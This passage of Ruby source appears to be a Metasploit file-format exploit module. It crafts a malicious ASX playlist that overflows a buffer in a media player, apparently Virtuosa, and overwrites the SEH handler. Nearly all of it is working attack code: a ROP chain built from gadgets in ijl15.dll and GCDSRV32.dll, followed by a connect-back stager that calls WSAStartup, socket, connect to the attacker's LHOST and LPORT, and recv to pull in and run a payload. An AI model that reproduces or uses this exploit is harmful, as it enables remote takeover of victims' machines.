        # === gonna construct a struct sockaddr
        # == port in big endian
        ropstack.concat(ropstack_encode_pointer([datastore['LPORT'].to_i].pack('n').unpack('v').first))
        # ropstack.concat(ropstack_encode_pointer(datastore['LPORT'].to_i))
        # 0x6004803D :  # POP ECX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6004803d)
        ropstack.push(0x60055b5e)
        # 0x1001DDB4 :  # MOV DWORD PTR DS:[ECX],EAX # RETN 	[Module : GCDSRV32.dll]  ** 
        ropstack.push(0x1001ddb4)
        # == ip address in big endian
        ip = IPAddr.new(datastore['LHOST'])
        ropstack.concat(ropstack_encode_pointer([ip.to_i].pack('N').unpack('V').first))
        # ropstack.concat(ropstack_encode_pointer(ip.to_i))
        # 0x6004803D :  # POP ECX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6004803d)
        ropstack.push(0x60055b60)
        # 0x1001DDB4 :  # MOV DWORD PTR DS:[ECX],EAX # RETN 	[Module : GCDSRV32.dll]  ** 
        ropstack.push(0x1001ddb4)

        # size of struct sockaddr = 16 bytes
        ropstack.concat(ropstack_gen_pow2(4))
        # 0x6004803D :  # POP ECX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6004803d)
        ropstack.push(0x60053a38)
        # 0x1001DDB4 :  # MOV DWORD PTR DS:[ECX],EAX # RETN 	[Module : GCDSRV32.dll]  ** 
        ropstack.push(0x1001ddb4)

        # recv() buffer allocation
        ropstack.concat(ropstack_malloc())
        # set recv() buffer argument
        # 0x6004803D :  # POP ECX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6004803d)
        ropstack.push(0x60053a70)
        # 0x1001DDB4 :  # MOV DWORD PTR DS:[ECX],EAX # RETN 	[Module : GCDSRV32.dll]  ** 
        ropstack.push(0x1001ddb4)
        # set payload return address
        # 0x6004803D :  # POP ECX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6004803d)
        ropstack.push(0x60053a7c)
        # 0x1001DDB4 :  # MOV DWORD PTR DS:[ECX],EAX # RETN 	[Module : GCDSRV32.dll]  ** 
        ropstack.push(0x1001ddb4)

        # recv() buffer len
        # size of struct sockaddr = 16 bytes
        ropstack.concat(ropstack_gen_pow2(16))
        # 0x6004803D :  # POP ECX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6004803d)
        ropstack.push(0x60053a74)
        # 0x1001DDB4 :  # MOV DWORD PTR DS:[ECX],EAX # RETN 	[Module : GCDSRV32.dll]  ** 
        ropstack.push(0x1001ddb4)


        # WSAStartup WxVersion
        ropstack.concat(ropstack_gen_pow2(1))
        # 0x6003D17B :  # XCHG EAX,ECX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6003d17b)
        # 2^9 = 512
        ropstack.concat(ropstack_gen_pow2(9))
        # 0x10010407 :  # ADD EAX,ECX # POP EBP # RETN 	[Module : GCDSRV32.dll]  ** 
        ropstack.push(0x10010407)
        ropstack.push('JUNK')
        # we got 0x202 = WinSock version 2.2
        # 0x6004803D :  # POP ECX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6004803d)
        ropstack.push(0x600539ec)
        # 0x1001DDB4 :  # MOV DWORD PTR DS:[ECX],EAX # RETN 	[Module : GCDSRV32.dll]  ** 
        ropstack.push(0x1001ddb4)


        # WSAStartup
        # 0x60053960
        ropstack.push('JUNK')
        # 0x60040DAD :  # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x60040dad)   # seip of WSAStartup()
        ropstack.push('JUNK')       # WxVersion
        ropstack.push(0x60053b04)   # address

        # just to avoid caps
        # 0x60040DAD :  # RETN 	[Module : ijl15.dll]  ** 
        for i in 1..2
            ropstack.push(0x60040dad)   # 
        end

        # socket(AF_INET, SOCK_STREAM, 0) 
        # 0x6005396c
        ropstack.push('JUNK')   # socket
        # 0x60040DAD :  # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x60040dad)   # seip of socket()
        ropstack.push('JUNK')   # af       = AF_INET
        ropstack.push('JUNK')   # type     = SOCK_STREAM
        ropstack.push('JUNK')   # protocol = 0
        # set connect() sockfd argument
        # 0x6002C3F9 :  # POP EDX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6002c3f9)
        ropstack.push(0x60053a30)  # data in ijl15.dll
        # 0x600270E3 :  # MOV DWORD PTR DS:[EDX],EAX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x600270e3)
        # set recv() sockfd argument
        # 0x6002C3F9 :  # POP EDX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x6002c3f9)
        ropstack.push(0x60053a6c)  # data in ijl15.dll
        # 0x600270E3 :  # MOV DWORD PTR DS:[EDX],EAX # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x600270e3)

        # connect(sockfd, name, namelen);
        # 0x60053988
        ropstack.push('JUNK')   # connect
        # 0x60040DAD :  # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x60040dad)   # seip of connect()
        ropstack.push('JUNK')   # sockfd
        ropstack.push(0x60055b5c)   # struct sockaddr
        ropstack.push('JUNK')   # sizeof(struct sockaddr)

        # just to avoid caps
        # 0x60040DAD :  # RETN 	[Module : ijl15.dll]  ** 
        for i in 1..10
            ropstack.push(0x60040dad)   # 
        end

        # recv(sockfd, buf, len, flags);
        # 0x600539a4
        ropstack.push('JUNK')   # recv
        # 0x60040DAD :  # RETN 	[Module : ijl15.dll]  ** 
        ropstack.push(0x60040dad)   # seip of recv()
        ropstack.push('JUNK')   # sockfd
        ropstack.push('JUNK')   # buf
        ropstack.push('JUNK')   # len
        ropstack.push('JUNK')   # flags = 0

        # address of payload (allocated heap)
        ropstack.push('JUNK')
    end

    # set stack pattern
    def ropstack_before_seh
        ropstack = []
        counter_pointers = 0
        counter_junk = 0
        rop_offset = 137
        nseh_offset = 1021
        seh_offset = 1025

        ropstack.concat(ropstack_resolve_part1())

        # generate ropstack
        ropstack, counter_pointers, counter_junk = ropstack_gen(ropstack)
        stack = rand_text_alpha_lower(rop_offset)
        stack << ropstack
        stack << rand_text_alpha_lower(nseh_offset - stack.length)
        stack << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $+" + (seh_offset - stack.length + 4).to_s).encode_string
        stack << make_nops(seh_offset - stack.length)
        # 0x6003FBCA : 464  : 	 # ADD ESP,464 # POP EBX # POP EBP # POP ESI # POP EDI # RETN - ijl15.dll -  ** 
        stack << [0x6003fbca].pack('V')

        return [stack, counter_pointers, counter_junk]
    end

    def ropstack_fullrop_stager_connectback
        ropstack = []

        # imports resolution
        # bs for before seh
        rop_offset = 137
        nseh_offset = 1021
        seh_offset = 1025
        ropstack_bs, counter_pointers_bs, counter_junk_bs = ropstack_before_seh()
        print_status('Pointers used         : ' << counter_pointers_bs.to_s() << ' (' << (counter_pointers_bs * 4).to_s() << ' bytes)')
        print_status('Junk bytes used       : ' << (counter_junk_bs * 4).to_s())
        print_status('Padding size          : ' << (seh_offset - counter_pointers_bs * 4 - counter_junk_bs * 4 - rop_offset).to_s())
        print_status('ROP stack size        : ' << ropstack_bs.length.to_s())
        print_status('Bytes before SEH write: ' << (seh_offset - ropstack_bs.length).to_s() + "\n")

        # after seh
        ropstack = ropstack_resolve_part2()
        ropstack, counter_pointers, counter_junk = ropstack_gen(ropstack)
        payload = ropstack_stager_connectback()
        payload, counter_p, counter_j = ropstack_gen(payload)

        stack = ropstack_bs
        stack << ropstack
        stack << payload

        return [stack, counter_pointers_bs+counter_pointers+counter_p, counter_junk_bs+counter_junk+counter_j]
    end

    def exploit
        print_status('Before SEH:')
        ropstack, counter_pointers, counter_junk = ropstack_fullrop_stager_connectback()
        print_status('Total:')
        print_status('Pointers used         : ' << counter_pointers.to_s() << ' (' << (counter_pointers * 4).to_s() << ' bytes)')
        print_status('Junk bytes used       : ' << (counter_junk * 4).to_s())
        print_status('ROP stack size        : ' << ropstack.length.to_s())

        asx_file = "<ASX version = '3.0'>\r\n"
        asx_file << "<Title>ASX BOF SEH Overwrite Exploit</Title>\r\n"
        asx_file << "<Abstract>Perhaps it is, what do you think?</Abstract>\r\n"
        asx_file << "<MoreInfo href = 'http://google.com\r\n"
        asx_file << "\r\n"
        asx_file << "<Entry>\r\n"
        asx_file << "<Title>How the hacker took over Virtuosa</Title>\r\n"
        asx_file << "<Author>Lucas Lundgren - acidgen [at] grayhat [onedot] se</Author>\r\n"
        asx_file << '<Ref href="'
        asx_file << ropstack
        asx_file << rand_text_alpha_lower(20000)
        asx_file << '"/>'
        asx_file << "\r\n"
        asx_file << "</Entry>"+"\r\n"
        asx_file << "</ASX>"
        asx_file << "\r\n\r\n"

        # direct ret overwrite at offset 1024
        # nseh overwrite at offset 1040
        ret_offset = 1024
        seh_offset = 1040

        print_status("Creating '#{datastore['FILENAME']}' file ...")

        file_create(asx_file)
    end

end
